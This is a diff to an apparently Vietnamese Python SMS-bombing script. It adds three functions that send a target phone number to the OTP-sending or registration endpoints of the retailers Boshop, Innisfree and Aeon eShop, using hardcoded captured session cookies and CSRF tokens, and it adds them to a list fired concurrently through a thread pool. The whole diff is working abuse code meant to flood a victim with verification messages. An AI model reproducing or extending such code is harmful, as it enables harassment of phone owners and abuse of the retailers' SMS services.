@@ -4218,7 +4218,125 @@ def lixibox():
     except requests.exceptions.RequestException:
         print("LIXIBOX | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def boshop():
+    cookies = {
+        'laravel_session': 'npDWHX1QmukK7H4aY6s8MT0wAWtt8OmuKMokvXDo',
+        'XSRF-TOKEN': 'eyJpdiI6IlBaR1pVMHBjXC9iXC9qU0c1dnRuamRoZz09IiwidmFsdWUiOiJzNFNNYWE5N1BVbERHY05keERmZEVRaFwvYzJHMWEzY2dqamxMd0NFUEdETjl1WWZ4eFY0V3lXbE9oaFdYXC84Sk4iLCJtYWMiOiIzZDllNTEwMDJkOTg1ZmVhODFjMzA2ZDJmMmFiMWU4NzY5YzYwNGZkYjVkNWIxOWZkYzZhZmQ3NjE4NmE2MmRhIn0%3D',
+    }
 
+    headers = {
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json;charset=UTF-8',
+        # 'Cookie': 'laravel_session=npDWHX1QmukK7H4aY6s8MT0wAWtt8OmuKMokvXDo; XSRF-TOKEN=eyJpdiI6IlBaR1pVMHBjXC9iXC9qU0c1dnRuamRoZz09IiwidmFsdWUiOiJzNFNNYWE5N1BVbERHY05keERmZEVRaFwvYzJHMWEzY2dqamxMd0NFUEdETjl1WWZ4eFY0V3lXbE9oaFdYXC84Sk4iLCJtYWMiOiIzZDllNTEwMDJkOTg1ZmVhODFjMzA2ZDJmMmFiMWU4NzY5YzYwNGZkYjVkNWIxOWZkYzZhZmQ3NjE4NmE2MmRhIn0%3D',
+        'Origin': 'https://www.boshop.vn',
+        'Referer': 'https://www.boshop.vn/login',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'X-CSRF-TOKEN': 'jKpqJjLvl37vRSghc4wmJm3lyWjR3fW7WmcBcejD',
+        'X-XSRF-TOKEN': 'eyJpdiI6IlBaR1pVMHBjXC9iXC9qU0c1dnRuamRoZz09IiwidmFsdWUiOiJzNFNNYWE5N1BVbERHY05keERmZEVRaFwvYzJHMWEzY2dqamxMd0NFUEdETjl1WWZ4eFY0V3lXbE9oaFdYXC84Sk4iLCJtYWMiOiIzZDllNTEwMDJkOTg1ZmVhODFjMzA2ZDJmMmFiMWU4NzY5YzYwNGZkYjVkNWIxOWZkYzZhZmQ3NjE4NmE2MmRhIn0=',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    json_data = {
+        'phone': sdt,
+    }
+
+    try:
+        response = requests.post('https://www.boshop.vn/api-mobile/phone-login-send-otp', cookies=cookies, headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("BOSHOP | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("BOSHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def innisfree():
+    headers = {
+        'accept': 'application/json',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'ajax': 'true',
+        'authorization': 'null',
+        'cache': 'no-cache',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'cookie': 'XSRF-TOKEN=f7c1da5a-766c-4686-889e-b250ad1ce31a; SESSION=ZGMyZTcxOTEtNDBjMS00OTZhLWFmNzAtNTUzYjFkNTBkODY3; RB_PCID=1725091307380345696; EG_GUID=7e4a0a77-c463-4008-af21-66b3ba9c3be4; G_ENABLED_IDPS=google; f7c1da5a-766c-4686-889e-b250ad1ce31a; RB_SSID=6KR7mCyhuv; AWSALB=Qg5ItmzAOFlupaGmCEVN4dQZhK4Hr+pxmjxyAy4xcNTJwOUSP8xKebVbrU7zNAuBiGIl64NI3uG56brstkemCTcLxZDFknziW43V8MDBLFJV1Ufx5yET5xQWMYym; AWSALBCORS=Qg5ItmzAOFlupaGmCEVN4dQZhK4Hr+pxmjxyAy4xcNTJwOUSP8xKebVbrU7zNAuBiGIl64NI3uG56brstkemCTcLxZDFknziW43V8MDBLFJV1Ufx5yET5xQWMYym',
+        'crossdomain': 'true',
+        'origin': 'https://www.innisfree.vn',
+        'priority': 'u=0, i',
+        'referer': 'https://www.innisfree.vn/member/join',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'withcredentials': 'true',
+        'x-requested-with': 'XMLHttpRequest',
+        'x-xsrf-token': 'f7c1da5a-766c-4686-889e-b250ad1ce31a',
+    }
+
+    data = {
+        'mobileno': sdt,
+    }
+
+    try:
+        response = requests.post('https://www.innisfree.vn/incom/authNumberSendProc', headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("INNISFREE | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("INNISFREE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def aeoneshop():
+    cookies = {
+        'crumb': 'mgNCJ7eOkmNe66K8HjPZqgsygBR74cZptFsVw1bEwuS',
+        'deviceId': '9777bab0-9a13-42fe-a025-7da185a19a69',
+        'locationIdentifierIds': '6476ec32b597582eddf0df29',
+        'selectedCity': 'Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh',
+        'selectedDistrict': 'Qu%E1%BA%ADn%2001',
+        'selectedWard': 'Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9',
+        'i18next': 'vi-VN',
+        'locationCaptured': 'true',
+        'aeon-vn-prodnxweb.sid': 'Fe26.2**b573942679752dac7d8889d9b05b64da7cb8f9ec10e2384fd5f764765f6cbcf1*2_6I3uzqHnjydIdLdhQHnA*r2yUrjOTzU_iG9HYbv27bp4GzWbP4H9Q4KqlHGFCqpBx9biZbcupeMy3Cj2TjTB6**60ca31a36b110db6391b4af2ddb00749aff69b6846a612b1dcb240beccbb37d6*vGotPhW33YeRYMcmLi3ZA_ptHVwkKF0fja3RbUTfl8w',
+        'datadome': 'Du5wsIT6eKtl5Ed2qstyUBCb17Scx0A5v_PKYIjBAdWATDrF1ft0S6kdhgB8kcertql5K5rP4nh4rkJZ9~CGqatMbINnDlJaJT3xnSNq7r0OKDrFSRR3LlXnQMLUOnYo',
+        'superSession': '{%22id%22:%229777bab0-9a13-42fe-a025-7da185a19a69-1725092113626%22%2C%22expiry%22:1725093921699}',
+        '_dd_s': 'rum=1&id=6dd140e7-a028-4044-8a62-ffa296ecf9f5&created=1725092112784&expire=1725093046915',
+    }
+
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'api-json': 'true',
+        'content-type': 'application/json',
+        # 'cookie': 'crumb=mgNCJ7eOkmNe66K8HjPZqgsygBR74cZptFsVw1bEwuS; deviceId=9777bab0-9a13-42fe-a025-7da185a19a69; locationIdentifierIds=6476ec32b597582eddf0df29; selectedCity=Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh; selectedDistrict=Qu%E1%BA%ADn%2001; selectedWard=Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9; i18next=vi-VN; locationCaptured=true; aeon-vn-prodnxweb.sid=Fe26.2**b573942679752dac7d8889d9b05b64da7cb8f9ec10e2384fd5f764765f6cbcf1*2_6I3uzqHnjydIdLdhQHnA*r2yUrjOTzU_iG9HYbv27bp4GzWbP4H9Q4KqlHGFCqpBx9biZbcupeMy3Cj2TjTB6**60ca31a36b110db6391b4af2ddb00749aff69b6846a612b1dcb240beccbb37d6*vGotPhW33YeRYMcmLi3ZA_ptHVwkKF0fja3RbUTfl8w; datadome=Du5wsIT6eKtl5Ed2qstyUBCb17Scx0A5v_PKYIjBAdWATDrF1ft0S6kdhgB8kcertql5K5rP4nh4rkJZ9~CGqatMbINnDlJaJT3xnSNq7r0OKDrFSRR3LlXnQMLUOnYo; superSession={%22id%22:%229777bab0-9a13-42fe-a025-7da185a19a69-1725092113626%22%2C%22expiry%22:1725093921699}; _dd_s=rum=1&id=6dd140e7-a028-4044-8a62-ffa296ecf9f5&created=1725092112784&expire=1725093046915',
+        'origin': 'https://aeoneshop.com',
+        'priority': 'u=1, i',
+        'referer': 'https://aeoneshop.com/products/category/166/sua-tam---phu-kien-tam',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-csrf-token': 'mgNCJ7eOkmNe66K8HjPZqgsygBR74cZptFsVw1bEwuS',
+    }
+
+    json_data = {
+        'email': 'licehe9526@newcupon.com',
+        'phone': sdt,
+        'type': 'userRegistration',
+    }
+
+    try:
+        response = requests.post('https://aeoneshop.com/api/issue-otp', cookies=cookies, headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("AEONESHOP | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("AEONESHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 
 functions = [
@@ -4236,7 +4354,8 @@ functions = [
     viettelpost, xanhsm, acheckin, ghtk, pcspost, book365, richvn, nativex,
     vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
     hoasenhome, bibomart, sbiz, thieuhoa, dchic, yvesrocher, guardian,
-    leflair, vayvnd, bibabo, mocha35, xanhsm2, lixibox
+    leflair, vayvnd, bibabo, mocha35, xanhsm2, lixibox, boshop,
+    innisfree, aeoneshop
 ]
 
 with concurrent.futures.ThreadPoolExecutor() as executor:
